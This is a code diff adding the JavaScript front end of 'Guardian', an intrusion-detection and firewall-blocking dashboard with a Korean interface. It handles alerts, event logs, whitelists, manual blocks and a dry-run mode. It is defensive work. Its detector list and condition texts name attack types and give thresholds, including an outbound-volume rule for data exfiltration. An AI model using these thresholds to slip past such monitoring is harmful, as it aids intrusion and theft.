+// 설명 글 상자: 내용 줄 수만큼 높이를 맞춤 (입력할 때마다, 그리고 창을 열 때)
+const autoGrow = (t) => { if (!t) return; t.style.height = "auto"; t.style.height = t.scrollHeight + 2 + "px"; };
+document.addEventListener("input", (e) => { if (e.target.matches && e.target.matches("textarea.desc")) autoGrow(e.target); });function alertBox(box, kind, text) { clear(box); box.append(el("div", {class: "alert " + kind}, text)); }
+
+async function api(path, method = "GET", body) {
+  const r = await fetch(path, {
+    method, headers: {"X-Token": token, "Content-Type": "application/json"},
+    body: body ? JSON.stringify(body) : undefined,
+  });
+  if (r.status === 401) { showLogin(); throw new Error("로그인 필요"); }
+  const data = await r.json().catch(() => ({}));
+  if (!r.ok) throw new Error(data.error || ("오류 " + r.status));
+  return data;
+}
+
+function showLogin(msg) {
+  $("#login").hidden = false;
+  $("#loginErr").hidden = !msg; $("#loginErr").textContent = msg || "";
+}
+$("#loginForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  token = $("#tokenInput").value.trim();
+  try {
+    await api("/api/plugins");
+    try { localStorage.setItem("gd_token", token); } catch (err) {}
+    $("#login").hidden = true; myIp = ""; refresh(true).then(() => { if (currentView === "report") loadReport().catch(() => {}); });
+  } catch (err) { showLogin("토큰이 맞지 않습니다"); }
+});
+
+// ── 값 변환 ──
+// 시각은 서버 시간대가 아니라 보는 사람의 시간대로 표시 (패킷 보기와 같은 기준)
+function fmtTime(iso) {
+  if (!iso) return "";
+  const d = new Date(String(iso).replace(/([+-]\d\d)(\d\d)$/, "$1:$2"));
+  if (isNaN(d)) return String(iso).replace("T", " ").slice(0, 19);
+  const p = (n) => String(n).padStart(2, "0");
+  return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
+}
+const fmtDur = (s) => s >= 60 ? Math.floor(s / 60) + "분 " + (s % 60) + "초" : s + "초";
+const fmtUp = (s) => `${Math.floor(s / 3600)}시간 ${Math.floor(s % 3600 / 60)}분`;
+const RISK = {info: "Low", warning: "Medium", critical: "Critical"};
+const ACTION = {alert: "탐지됨", block: "차단됨", "block(dry-run)": "차단(모의)", unblock: "해제됨"};
+const ADMIN_TYPES = new Set(["unblock", "manual_block", "rule_toggle"]);       // 공격 탐지가 아닌 관리 작업 기록
+const ruleNames = {syn_flood_distributed: "분산 SYN 플러드", unblock: "차단 해제", manual_block: "수동 차단"};   // 규칙 이름은 loadRules 가 채움
+const typeName = (t) => ruleNames[t] || t;
+// 알림: 위험도 기본값(Critical = 팝업+소리, Medium = 팝업, Low = 없음). 규칙에 따로 정한 값(notify)이 있으면 그것이 먼저
+const DEFAULT_ALERT = {critical: {popup: true, sound: true}, warning: {popup: true, sound: false}, info: {popup: false, sound: false}};
+const ruleNotify = {};                                 // 규칙 id -> {popup?, sound?} (loadRules 가 채움)
+function alertPolicy(type, severity) {
+  const d = DEFAULT_ALERT[severity] || DEFAULT_ALERT.info, n = ruleNotify[type] || {};
+  return {popup: n.popup ?? d.popup, sound: n.sound ?? d.sound, custom: "popup" in n || "sound" in n};
+}
+const alertText = (p) => p.popup && p.sound ? "팝업+소리" : p.popup ? "팝업만" : p.sound ? "소리만" : "알림 없음";
+let lastStatus = null, myIp = "", currentDry = true;
+
+function metric(label, value, delta, cls) {
+  return el("div", {class: "metric"}, el("div", {class: "label"}, label), el("div", {class: "value"}, value),
+    el("div", {class: "delta " + (cls || "flat")}, delta));
+}
+const signed = (n, unit) => (n > 0 ? "▲ +" : n < 0 ? "▼ " : "") + n + unit;
+
+function realBlockWarning() {
+  let msg = "실제로 방화벽 차단을 켤까요?\n화이트리스트에 없는 탐지 대상은 이제부터 진짜로 막힙니다.";
+  const n = lastStatus ? lastStatus.blocked_count : 0;
+  if (n) msg += `\n\n지금 모의 차단 목록에 있는 ${n}건도 바로 실제로 차단됩니다.`;
+  if (myIp && lastStatus && !lastStatus.whitelist.includes(myIp))
+    msg += `\n\n⚠ 지금 접속한 이 PC(${myIp})가 화이트리스트에 없습니다. 차단되면 대시보드에 못 들어올 수 있습니다.`;
+  return msg;
+}
+
+// 관제 서버 상태 카드: '탐지만(dry-run)' ↔ '실제 차단' 슬라이드. 3초마다 다시 그려도 조작 중에는 건드리지 않음
+let dryRunBusy = false;
+function dryRunMetric(dryRun) {
+  const sw = el("input", {type: "checkbox", role: "switch"});
+  sw.checked = !dryRun;                              // 켜짐 = 실제 차단
+  const txt = el("span", {class: "swtxt"});
+  const sync = () => { txt.textContent = sw.checked ? "실제 차단" : "탐지만 (dry-run)"; };
+  sync();
+  sw.addEventListener("change", async () => {
+    const goingReal = sw.checked;
+    if (goingReal && !confirm(realBlockWarning())) {
+      sw.checked = false; sync(); return;
+    }
+    dryRunBusy = true; sw.disabled = true;
+    try {
+      await api("/api/dry_run", "POST", {dry_run: !goingReal});
+      sync();
+    } catch (e) {
+      sw.checked = !goingReal; sync(); alert(e.message);
+    } finally {
+      sw.disabled = false; dryRunBusy = false; refresh(true);
+    }
+  });
+  return el("div", {class: "metric"}, el("div", {class: "label"}, "관제 서버 상태"), el("div", {class: "value", id: "statusValue"}, "정상 (Normal)"),
+    el("div", {class: "delta flat"}, el("label", {class: "switch"}, sw, el("span", {class: "slider"}), txt)));
+}
+
+// ── 연결 상태: 응답이 끊기면 화면 전체에 알리고, 옛 숫자는 흐리게 ──
+let lastOkAt = 0;
+function setGuardian(up, why) {
+  const conn = $("#conn"), banner = $("#downBanner");
+  conn.textContent = up ? "Guardian 연결됨" : "⚠ 응답 없음";
+  conn.className = "conn " + (up ? "ok" : "bad");
+  banner.hidden = up;
+  $("#metrics").classList.toggle("stale", !up);
+  $("#eventRows").classList.toggle("stale", !up);
+  if (up) { lastOkAt = Date.now(); $("#lastOk").textContent = ""; return; }
+  const when = lastOkAt ? new Date(lastOkAt).toTimeString().slice(0, 8) : "없음";
+  $("#lastOk").textContent = "마지막 응답 " + when;
+  banner.textContent = `⚠ Guardian 응답 없음: 탐지·차단이 멈췄을 수 있습니다. 화면의 숫자는 마지막으로 받은 값입니다 (마지막 정상 응답 ${when}). ${why || ""}`;
+  const v = $("#statusValue");
+  if (v) v.textContent = "⚠ 응답 없음";
+}
+function setMode(dry) {
+  currentDry = dry;
+  const m = $("#modeBadge");
+  m.textContent = dry ? "🧪 탐지만 (dry-run)" : "🔥 실제 차단 중";
+  m.className = "conn" + (dry ? "" : " real");
+}
+
+// ── 새 위협 알림: 다른 메뉴를 보고 있어도 알 수 있게 (브라우저 알림은 HTTPS 가 필요해 화면 안 알림과 소리로) ──
+let seenEvents = null, unread = 0, soundOn = false;
+soundOn = true;                                         // 전체 소리 스위치 (규칙별 설정보다 위). 기본은 켬
+try { soundOn = localStorage.getItem("gd_sound") !== "0"; } catch (e) {}
+const baseTitle = document.title;
+function drawUnread() {
+  const b = $("#newBadge");
+  b.hidden = !unread; b.textContent = unread;
+  document.title = (unread ? `(${unread}) ` : "") + baseTitle;
+}
+function drawSound() { $("#soundBtn").textContent = soundOn ? "🔔 소리 켬" : "🔕 소리 끔"; }
+function beep() {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const o = ctx.createOscillator(), g = ctx.createGain();
+    o.frequency.value = 880; g.gain.value = 0.08;
+    o.connect(g); g.connect(ctx.destination);
+    o.start(); o.stop(ctx.currentTime + 0.18);
+    o.onended = () => ctx.close();
+  } catch (e) {}
+}
+function toast(e) {
+  const t = el("button", {class: "toast " + e.severity, type: "button", onclick: () => { t.remove(); showView("overview", true); showAnalysis(e.id); }},
+    el("b", {}, typeName(e.type)), ` · ${e.source}`, el("br"), e.detail);
+  $("#toasts").append(t);
+  while ($("#toasts").children.length > 3) $("#toasts").firstChild.remove();
+  setTimeout(() => t.remove(), 9000);
+}
+function notifyNew(list) {
+  const real = list.filter((e) => !ADMIN_TYPES.has(e.type));
+  if (seenEvents === null) { seenEvents = new Set(real.map((e) => e.id)); return; }    // 처음 받은 것은 새 위협이 아님
+  const fresh = real.filter((e) => !seenEvents.has(e.id));
+  if (!fresh.length) return;
+  fresh.forEach((e) => seenEvents.add(e.id));
+  const loud = fresh.map((e) => [e, alertPolicy(e.type, e.severity)]).filter(([, p]) => p.popup || p.sound);   // '알림 없음'은 기록만
+  if (!loud.length) return;
+  if (currentView !== "overview" || document.hidden) { unread += loud.length; drawUnread(); }
+  loud.filter(([, p]) => p.popup).slice(0, 3).reverse().forEach(([e]) => toast(e));
+  if (soundOn && loud.some(([, p]) => p.sound)) beep();
+}
+document.addEventListener("visibilitychange", () => { if (!document.hidden && currentView === "overview") { unread = 0; drawUnread(); } });
+$("#soundBtn").addEventListener("click", () => {
+  soundOn = !soundOn;
+  try { localStorage.setItem("gd_sound", soundOn ? "1" : "0"); } catch (e) {}
+  drawSound();
+  if (soundOn) beep();
+});
+drawSound();
+$("#logoutBtn").addEventListener("click", () => {
+  token = "";
+  try { localStorage.removeItem("gd_token"); } catch (e) {}
+  $("#tokenInput").value = "";
+  showLogin();
+});
+
+// ── 지표 + 로그 ──
+const eventMatches = (e) => {
+  const sev = $("#evSev").value, q = $("#evIp").value.trim().toLowerCase(), type = $("#typeFilter").value;
+  return (!type || e.type === type) && (!sev || e.severity === sev)
+    && (!q || `${e.source} ${e.detail} ${typeName(e.type)}`.toLowerCase().includes(q));
+};
+// IP·MAC 옆에 붙는 메모 태그 (메모는 '보안 정책'의 차단 목록·IP별 기록에서 적음, /api/status 의 notes 로 받음)
+let ipNotes = {};
+const noteOf = (ip) => (ip && (ipNotes[ip] || ipNotes["mac:" + ip] || ipNotes[String(ip).replace(/^mac:/, "")])) || "";
+const noteTag = (ip) => { const n = noteOf(ip); return n ? el("span", {class: "tag memo", title: "메모: " + n}, n) : null; };
+const sourceLink = (src) => src === "*" ? src : [el("button", {class: "linkbtn", type: "button", title: "이 출발지의 공격 흐름 보기", onclick: () => showTimeline(src)}, src), noteTag(src)];
+let lastEvents = [];
+async function loadTop() {
+  const [st, evs] = await Promise.all([api("/api/status"), api("/api/events?limit=200")]);
+  lastStatus = st;
+  ipNotes = st.notes || {};
+  setGuardian(true);
+  setMode(st.dry_run);
+  const s = st.stats || {};
+  const attacks = evs.events.filter((e) => !ADMIN_TYPES.has(e.type));
+  const recent5 = attacks.filter((e) => Date.now() - Date.parse(e.timestamp) < 300000).length;
+  const now = Date.now();
+  let rate = 0;
+  if (lastPackets !== null && now > lastPacketsAt) rate = Math.round(((s.packets_total || 0) - lastPackets) / ((now - lastPacketsAt) / 1000));
+  lastPackets = s.packets_total || 0; lastPacketsAt = now;
+
+  const m = $("#metrics");
+  if (!dryRunBusy) {
+    clear(m);
+    const srv = st.server;
+    m.append(
+      metric("탐지된 위협 (누적)", (s.events_total || 0) + " 건", signed(recent5, " 건 (최근 5분)"), recent5 ? "down" : "flat"),
+      metric("방화벽 자동 차단 (누적)", (s.blocks_auto || 0) + " 건",
+        (s.blocks_auto_sim ? `모의 ${s.blocks_auto_sim} 건 · ` : "") + `지금 ${st.dry_run ? "모의 " : ""}차단 중 ${st.blocked_count} 건`, st.blocked_count ? "up" : "flat"),
+      metric("처리한 패킷", (s.packets_total || 0).toLocaleString() + " 개",
+        `초당 ${rate} 개` + (st.missed_packets ? ` · 못 따라간 패킷 약 ${st.missed_packets.toLocaleString()} 개` : ""), st.missed_packets > 1000 ? "down" : "flat"),
+      metric("서버 부담", srv ? `메모리 ${srv.mem_percent}%` : "-", srv ? `부하 ${srv.load1} (CPU ${srv.cpus}개)` : "", "flat"),
+      dryRunMetric(st.dry_run),
+    );
+  }
+
+  const sel = $("#typeFilter");
+  const known = new Set([...sel.options].map((o) => o.value));
+  evs.events.forEach((e) => { if (!known.has(e.type)) { known.add(e.type); sel.append(el("option", {value: e.type}, typeName(e.type))); } });
+  notifyNew(evs.events);
+  lastEvents = evs.events;
+  drawEvents();
+  const t = $("#blockTarget");                          // 차단 칸의 기본값: 가장 최근 공격자 (유출 목적지·출발지 없는 탐지·관리 작업은 제외)
+  const att = attacks.find((e) => e.type !== "exfiltration" && e.source !== "*");
+  if (!t.value && !t.dataset.touched && att) t.value = (att.type === "arp_spoof" ? "mac:" : "") + att.source;
+}
+function drawEvents() {
+  const tb = $("#eventRows");
+  if (selecting(tb)) return;
+  const rows = lastEvents.filter(eventMatches);
+  clear(tb);
+  if (!rows.length) tb.append(el("tr", {}, el("td", {colspan: 8}, lastEvents.length ? "조건에 맞는 이벤트가 없습니다." : "아직 탐지된 이벤트가 없습니다.")));
+  rows.forEach((e) => tb.append(el("tr", {},
+    el("td", {}, fmtTime(e.timestamp)), el("td", {}, sourceLink(e.source)), el("td", {}, e.target || "", noteTag(e.target)), el("td", {title: e.type}, typeName(e.type)),
+    el("td", {class: "sev-" + RISK[e.severity]}, RISK[e.severity] || e.severity),
+    el("td", {}, ACTION[e.action] || e.action), el("td", {class: "wrap"}, e.detail),
+    el("td", {}, el("button", {class: "btn sm", type: "button", onclick: () => showAnalysis(e.id)}, "ℹ️ 정보")))));
+}
+["#typeFilter", "#evSev", "#evIp"].forEach((id) => $(id).addEventListener("input", drawEvents));
+
+// ── CSV 내보내기 (엑셀에서 한글이 깨지지 않게 BOM 포함, 수식으로 해석될 값은 앞에 ' 를 붙임) ──
+function downloadCsv(events) {
+  const cell = (v) => {
+    let t = String(v == null ? "" : v);
+    if (/^[=+\-@]/.test(t)) t = "'" + t;
+    return `"${t.replace(/"/g, '""')}"`;
+  };
+  const head = ["시간", "출발지", "출발지 메모", "대상", "유형", "이벤트", "위험도", "상태", "상세"];
+  const lines = events.map((e) => [fmtTime(e.timestamp), e.source, noteOf(e.source), e.target, e.type, typeName(e.type), RISK[e.severity] || e.severity, ACTION[e.action] || e.action, e.detail].map(cell).join(","));
+  const a = el("a", {href: URL.createObjectURL(new Blob(["\ufeff" + [head.map(cell).join(","), ...lines].join("\r\n")], {type: "text/csv;charset=utf-8"})), download: "guardian_events.csv"});
+  document.body.append(a); a.click(); a.remove();
+  setTimeout(() => URL.revokeObjectURL(a.href), 5000);
+}
+$("#evCsv").addEventListener("click", async () => {
+  try { downloadCsv((await api("/api/events?limit=1000")).events.filter(eventMatches)); } catch (e) { alert(e.message); }
+});
+
+// ── 공격자 타임라인: 한 출발지의 탐지·차단·해제를 시간순으로 ──
+let tlSource = "";
+async function showTimeline(src) {
+  tlSource = src;
+  $("#tlTitle").textContent = `🕒 ${src}${noteOf(src) ? ` (${noteOf(src)})` : ""} 의 공격 흐름`;
+  const body = $("#tlBody");
+  clear(body); body.append(el("p", {class: "caption"}, "불러오는 중…"));
+  if (!$("#tlDialog").open) $("#tlDialog").showModal();
+  try {
+    const list = (await api("/api/events?limit=1000&source=" + encodeURIComponent(src))).events.slice().reverse();
+    clear(body);
+    if (!list.length) return body.append(el("p", {}, "기록이 없습니다."));
+    const attacks = list.filter((e) => !ADMIN_TYPES.has(e.type));
+    const kinds = [...new Set(attacks.map((e) => typeName(e.type)))];
+    body.append(el("p", {class: "caption"}, `탐지 ${attacks.length}건 · ${kinds.join(" → ") || "관리 작업만 있음"}`));
+    body.append(el("ul", {class: "timeline"}, list.map((e) => el("li", {class: ADMIN_TYPES.has(e.type) ? "admin" : e.severity},
+      el("time", {}, fmtTime(e.timestamp)), el("b", {}, typeName(e.type)), ` · ${ACTION[e.action] || e.action}`, el("br"), e.detail))));
+  } catch (err) { clear(body); alertBox(body, "error", err.message); }
+}
+$("#tlClose").addEventListener("click", () => $("#tlDialog").close());
+$("#tlBlock").addEventListener("click", () => {
+  $("#tlDialog").close();
+  goBlock(/^([0-9a-f]{2}:){5}[0-9a-f]{2}$/i.test(tlSource) ? "mac:" + tlSource : tlSource);
+});
+function goBlock(target) {
+  $("#blockTarget").value = target; $("#blockTarget").dataset.touched = "1";     // 차단은 직접 눌러야 실행됨 (여기서는 칸만 채움)
+  showView("policy", true);
+  $("#blockForm").scrollIntoView({behavior: "smooth", block: "center"});
+  $("#blockTarget").focus();
+}
+// ── 침입 상세 분석 ('정보' 버튼): 어디서 · 어떤 공격 · 영향 · 대응 결과 · 권고 ──
+const EV_LEVEL = {good: "success", warn: "warning", bad: "error", info: "info"};
+let evOpenId = null;
+async function showAnalysis(id) {
+  evOpenId = id;
+  const body = $("#evBody");
+  clear(body); body.append(el("p", {class: "caption"}, "분석 중…"));
+  if (!$("#evDialog").open) $("#evDialog").showModal();
+  try {
+    const a = await api("/api/event_analysis?id=" + encodeURIComponent(id));
+    if (evOpenId !== id) return;                      // 그 사이 다른 이벤트를 열었으면 무시
+    clear(body);
+    $("#evTitle").textContent = "ℹ️ 침입 상세 분석 — " + a.name;
+    body.append(el("div", {class: "alert " + (EV_LEVEL[a.headline.level] || "info")}, el("b", {}, a.headline.text)));
+    a.sections.forEach((s) => body.append(el("div", {class: "evsec"}, el("h4", {}, s.title), el("ul", {}, s.lines.map((l) => el("li", {}, l))))));
+    if (a.server_now) body.append(el("p", {class: "caption"},
+      `지금 서버: 메모리 사용 ${a.server_now.mem_percent}% · 부하(1분) ${a.server_now.load1} (CPU ${a.server_now.cpus}개) — 공격 당시가 아니라 조회한 지금의 값입니다.`));
+    body.append(el("details", {class: "expander"}, el("summary", {}, "🔎 근거 데이터"),
+      el("div", {}, el("dl", {class: "evdl"}, a.evidence.flatMap(([k, v]) => [el("dt", {}, k), el("dd", {}, v)])))));
+    $("#evBlockGo").hidden = !a.actions.can_block;
+    $("#evBlockGo").dataset.target = a.actions.target;
+    const ev = a.event || {};                          // 관리 작업(차단 해제 등)·IP 가 아닌 출발지는 관련 패킷을 고를 수 없음
+    $("#evPcap").hidden = !(a.headline.level !== "info" && (ev.type === "arp_spoof" || /^\d+\.\d+\.\d+\.\d+$/.test(ev.source || "")));
+  } catch (err) { if (evOpenId === id) { clear(body); alertBox(body, "error", err.message); } }
+}
+$("#evPcap").addEventListener("click", () => evOpenId && downloadPcap("event=" + encodeURIComponent(evOpenId), $("#evPcap")));
+
+// ── PCAP 내보내기: 토큰을 헤더로 보내야 해서 링크 대신 받아서 파일로 저장 ──
+async function downloadPcap(qs, btn) {
+  const label = btn.textContent;
+  btn.disabled = true; btn.textContent = "만드는 중…";
+  try {
+    const r = await fetch("/api/pcap?" + qs, {headers: {"X-Token": token}});
+    if (r.status === 401) { showLogin(); return; }
+    if (!r.ok) { const d = await r.json().catch(() => ({})); alert(d.error || ("오류 " + r.status)); return; }
+    const blob = await r.blob();
+    const name = (/filename="([^"]+)"/.exec(r.headers.get("Content-Disposition") || "") || [])[1] || "guardian.pcap";
+    const a = el("a", {href: URL.createObjectURL(blob), download: name});
+    document.body.append(a); a.click(); a.remove();
+    setTimeout(() => URL.revokeObjectURL(a.href), 5000);
+    const n = r.headers.get("X-Packet-Count");
+    if (n) btn.title = `마지막으로 받은 파일: ${name} (패킷 ${n}개)`;
+  } catch (e) { alert(e.message); }
+  finally { btn.disabled = false; btn.textContent = label; }
+}
+$("#evRefresh").addEventListener("click", () => evOpenId && showAnalysis(evOpenId));
+$("#evClose").addEventListener("click", () => $("#evDialog").close());
+$("#evBlockGo").addEventListener("click", () => {
+  const t = $("#evBlockGo").dataset.target;
+  if (!t) return;
+  $("#evDialog").close();
+  goBlock(t);
+});
+$("#blockTarget").addEventListener("input", (e) => e.target.dataset.touched = "1");
+
+// ── 차단 제어 ──
+// 메모 칸: 입력 중에는 3초 새로고침이 다시 그리지 않도록 포커스가 있으면 건너뜀 (loadBlocked/loadHistory 참고)
+function noteEditor(target, current) {
+  const inp = el("input", {class: "txt", maxlength: "200", placeholder: "메모"});
+  inp.value = current || "";
+  const save = async () => {
+    try { await api("/api/note", "POST", {target, note: inp.value}); inp.blur(); refresh(true); }
+    catch (e) { alert(e.message); }
+  };
+  inp.addEventListener("keydown", (e) => { if (e.key === "Enter") save(); });
+  return el("div", {class: "note-edit"}, inp, el("button", {class: "btn sm", onclick: save}, "저장"));
+}
+async function loadBlocked() {
+  const d = await api("/api/blocked");
+  const tb = $("#blockedRows"), note = $("#blockedNote");
+  clear(note);
+  if (d.simulated && d.blocked.length) note.append(el("div", {class: "alert warning"},
+    "지금은 탐지만(dry-run) 모드라 아래 목록은 '모의'입니다. 실제로 막고 있지 않습니다. 실제 차단으로 바꾸면 이 목록이 바로 적용됩니다."));
+  if (typing(tb) || selecting(tb)) return;
+  clear(tb);
+  if (!d.blocked.length) tb.append(el("tr", {}, el("td", {colspan: 6}, "차단 중인 대상이 없습니다.")));
+  d.blocked.forEach((b) => tb.append(el("tr", {}, el("td", {}, sourceLink(b.target.replace(/^mac:/, "")), d.simulated && el("span", {class: "tag sim"}, "모의")), el("td", {}, typeName(b.reason)),
+    el("td", {}, fmtTime(b.since)), el("td", {}, b.permanent ? "영구" : fmtSpan(Math.max(0, b.remaining_sec))),
+    el("td", {}, noteEditor(b.target, b.note)),
+    el("td", {}, el("button", {class: "btn sm", onclick: () => unblock(b.target)}, "해제")))));
+}
+async function loadHistory() {
+  const d = await api("/api/history?limit=200");
+  const tb = $("#historyRows");
+  if (typing(tb) || selecting(tb)) return;
+  clear(tb);
+  if (!d.history.length) tb.append(el("tr", {}, el("td", {colspan: 7}, "아직 기록된 공격자가 없습니다.")));
+  d.history.forEach((h) => tb.append(el("tr", {},
+    el("td", {}, sourceLink(h.source), h.blocked_now && el("span", {class: "tag"}, currentDry ? "모의 차단 중" : "차단 중")),
+    el("td", {}, h.total + " 회"), el("td", {}, h.blocks + " 회"),
+    el("td", {class: "tagline"}, Object.entries(h.by_type).sort((a, b) => b[1] - a[1]).map(([t, n]) => `${typeName(t)} ×${n}`).join(", ")),
+    el("td", {}, fmtTime(h.first)), el("td", {}, fmtTime(h.last)),
+    el("td", {}, noteEditor(h.source, h.note)))));
+}
+function drawWhitelist() {
+  const box = $("#whitelistBox");
+  if (!lastStatus) return;
+  if (typing(box)) return;
+  clear(box);
+  const fixed = new Set(lastStatus.whitelist_fixed || []);
+  const asTarget = (w) => (/^([0-9a-f]{2}:){5}[0-9a-f]{2}$/i.test(w) ? "mac:" + w : w);
+  box.append(el("div", {class: "ptags"}, lastStatus.whitelist.map((w) => el("span", {class: "ptag"}, w, noteOf(w) ? ` · ${noteOf(w)}` : "", " ",
+    fixed.has(w) ? el("span", {title: "서버 자신의 주소라 뺄 수 없습니다"}, "🔒")
+      : el("button", {class: "linkbtn", type: "button", title: "화이트리스트에서 빼기", onclick: () => removeWhitelist(w, asTarget(w))}, "✕")))));
+  if (myIp && !lastStatus.whitelist.includes(myIp)) box.append(el("div", {class: "alert warning"},
+    `지금 접속한 이 PC(${myIp})는 화이트리스트에 없습니다. 차단되면 대시보드에 못 들어올 수 있습니다.`));
+}
+async function whitelistAct(action, target, done) {
+  try {
+    const r = await api("/api/whitelist", "POST", {action, target});
+    alertBox($("#whitelistMsg"), r.ok ? "success" : "warning", r.ok ? done + (r.unblocked ? " 지금 차단 중이던 것은 차단을 풀었습니다." : "") : r.reason);
+    await loadTop(); drawWhitelist(); loadBlocked();
+  } catch (e) { alertBox($("#whitelistMsg"), "error", e.message); }
+}
+function removeWhitelist(w, target) {
+  let msg = `${w} 을(를) 화이트리스트에서 뺄까요?\n앞으로 이 주소가 공격으로 탐지되면 자동 차단됩니다.`;
+  if (w === myIp) msg += `\n\n⚠ ${w} 은(는) 지금 접속한 이 PC 입니다. 빼면 차단되어 대시보드에 못 들어올 수 있습니다.`;
+  if (confirm(msg)) whitelistAct("remove", target, `${w} 을(를) 뺐습니다.`);
+}
+$("#whitelistForm").addEventListener("submit", (e) => {
+  e.preventDefault();
+  const t = $("#wlTarget").value.trim();
+  if (!t) return;
+  if (!confirm(`${t} 은(는) 앞으로 어떤 공격을 해도 자동 차단되지 않습니다 (탐지·알림은 됩니다).\n신뢰하는 주소가 맞나요?`)) return;
+  whitelistAct("add", t, `${t} 을(를) 추가했습니다.`).then(() => { $("#wlTarget").value = ""; });
+});
+async function loadAudit() {
+  if (!$("#auditBox").open) return;
+  const d = await api("/api/audit");
+  const tb = $("#auditRows");
+  if (selecting(tb)) return;
+  clear(tb);
+  if (!d.audit.length) tb.append(el("tr", {}, el("td", {colspan: 5}, "아직 기록이 없습니다.")));
+  d.audit.forEach((x) => tb.append(el("tr", {}, el("td", {}, fmtTime(x.time)), el("td", {}, x.ip), el("td", {}, x.action),
+    el("td", {class: "wrap"}, Object.entries(x.detail || {}).map(([k, v]) => `${k}=${v}`).join(", ")), el("td", {}, x.code))));
+}
+$("#auditBox").addEventListener("toggle", () => loadAudit().catch(() => {}));
+async function unblock(target) {
+  try {
+    const r = await api("/api/unblock", "POST", {target});
+    alertBox($("#blockMsg"), r.ok ? "success" : "warning", r.ok ? `해제 완료: ${target}` : r.reason);
+    loadBlocked();
+  } catch (e) { alertBox($("#blockMsg"), "error", e.message); }
+}
+$("#blockForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const target = $("#blockTarget").value.trim();
+  if (target === myIp && !confirm(`${target} 은(는) 지금 접속한 이 PC 입니다. 차단하면 대시보드에 못 들어올 수 있습니다. 계속할까요?`)) return;
+  const body = {target, reason: "dashboard"};
+  const note = $("#blockNote").value.trim(); if (note) body.note = note;
+  if ($("#blockPerm").checked) body.permanent = true;
+  else {
+    const n = (id) => Math.max(0, parseInt($(id).value, 10) || 0);
+    const sec = n("#durDay") * 86400 + n("#durHour") * 3600 + n("#durMin") * 60;
+    if (sec <= 0) return alertBox($("#blockMsg"), "warning", "차단 기간을 1분 이상으로 지정하거나 '영구 차단'을 체크하세요.");
+    body.duration_sec = sec;
+  }
+  try {
+    let r = await api("/api/block", "POST", body);
+    if (r.exists) {                               // 이미 차단 중 -> 현재 상태를 보여주고 덮어쓸지 확인
+      const c = r.current;
+      const left = c.permanent ? "영구 차단" : "남은 시간 " + fmtDur(Math.max(0, c.remaining_sec));
+      const next = body.permanent ? "영구 차단" : "차단 기간 " + fmtDur(body.duration_sec);
+      const ok = confirm(`${target} 은(는) 이미 차단 중입니다.\n\n` +
+        `현재 차단 이유: ${c.reason}\n시작: ${fmtTime(c.since)}\n${left}\n` + (c.note ? `메모: ${c.note}\n` : "") +
+        `\n새 설정(${next})으로 덮어쓰시겠습니까?`);
+      if (!ok) return alertBox($("#blockMsg"), "info", "덮어쓰기를 취소했습니다. 기존 차단은 그대로입니다.");
+      r = await api("/api/block", "POST", {...body, overwrite: true});
+    }
+    if (r.ok) {
+      const box = $("#blockMsg"); clear(box);
+      box.append(el("div", {class: "alert success"}, `대응 완료: ${target} 이(가) ${body.permanent ? "영구 " : ""}차단 목록에 등록되었습니다.`),
+        currentDry && el("div", {class: "alert info"}, "지금은 모의 모드(dry-run)라 실제 iptables 차단 없이 기록만 됩니다. 실제 차단은 '개요' 메뉴의 '관제 서버 상태' 슬라이드로 켭니다."));
+    } else alertBox($("#blockMsg"), "warning", r.reason);
+    loadBlocked(); loadHistory();
+  } catch (err) { alertBox($("#blockMsg"), "error", err.message); }
+});
+const syncPerm = () => $("#durBox").classList.toggle("off", $("#blockPerm").checked);
+$("#blockPerm").addEventListener("change", () => {
+  const off = $("#blockPerm").checked;
+  ["#durDay", "#durHour", "#durMin"].forEach((id) => { $(id).disabled = off; });
+  syncPerm();
+});
+
+// ── 탐지 규칙 (모든 규칙이 rules/ 폴더의 파일 하나씩. 기본/사용자 구분 없음) ──
+// 작동 방식: 방화벽(패킷을 직접 봄 — 기본 탐지기 + 직접 만든 규칙) / 플러그인(주기적으로 스크립트 실행)
+const BUILTIN_DETECTORS = ["port_scan", "syn_flood", "icmp_flood", "ssh_bruteforce", "ssh_login_success", "arp_spoof", "exfiltration"];
+const ruleGroup = (r) => (r.detector === "script" ? "script" : "firewall");
+const ruleKind = (r) => (r.detector === "script" ? "🧩 플러그인 스크립트" : BUILTIN_DETECTORS.includes(r.detector) ? `🔥 내장 탐지기(${r.detector})` : "🔥 직접 만든 규칙");
+const PROTO_TXT = {tcp: "TCP", udp: "UDP", icmp: "ICMP(핑 등)", any: "TCP/UDP/ICMP"};
+// 조건을 사람이 읽는 문장으로 (기본 탐지기는 파일에 든 임계값으로 만든다)
+const COND = {
+  port_scan: (r) => `${r.window_sec}초 동안 서로 다른 포트 ${r.distinct_ports}개에 접속 시도`,
+  syn_flood: (r) => `${r.window_sec}초 동안 한 IP 에서 SYN ${r.max_syn}개 (출발지 ${r.global_min_sources}곳 이상이면 합계 ${r.global_max_syn}개)`,
+  icmp_flood: (r) => `${r.window_sec}초 동안 ping ${r.max_packets}개`,
+  ssh_bruteforce: (r) => `${r.ports.join(", ")}번 포트에 ${r.window_sec}초 동안 접속 시도 ${r.max_attempts}회`,
+  ssh_login_success: (r) => `${fmtSpan(r.window_sec)} 안에 로그인 실패 ${r.min_failures}회 이상인 IP 의 로그인 성공 (sshd 로그)`,
+  arp_spoof: () => "알려진 IP 의 MAC 주소가 바뀜",
+  exfiltration: (r) => `${r.window_sec}초 동안 외부로 ${(r.max_bytes / 1e6).toFixed(0)}MB 이상 전송`,
+  custom: (r) => {
+    const ports = r.dst_ports.length ? ` ${r.dst_ports.join(", ")}번 포트` : "";
+    const syn = r.protocol === "tcp" && r.tcp_flags === "syn" ? " 새 연결" : "";
+    const what = r.distinct === "dst_port" ? `서로 다른 포트 ${r.count}개` : `${r.count}회`;
+    return `${PROTO_TXT[r.protocol]}${ports}${syn} — ${r.window_sec}초 동안 ${what}`;
+  },
+  script: (r) => `${r.command.join(" ")} · ${r.interval_sec}초마다 (시간제한 ${r.timeout_sec}초)`,
+};
+const condText = (r) => (COND[r.detector] || COND.custom)(r);
+
+// ── 규칙의 차단 설정: 켜짐/꺼짐 슬라이드 + 차단 기간(일·시간·분) 또는 영구 차단 ──
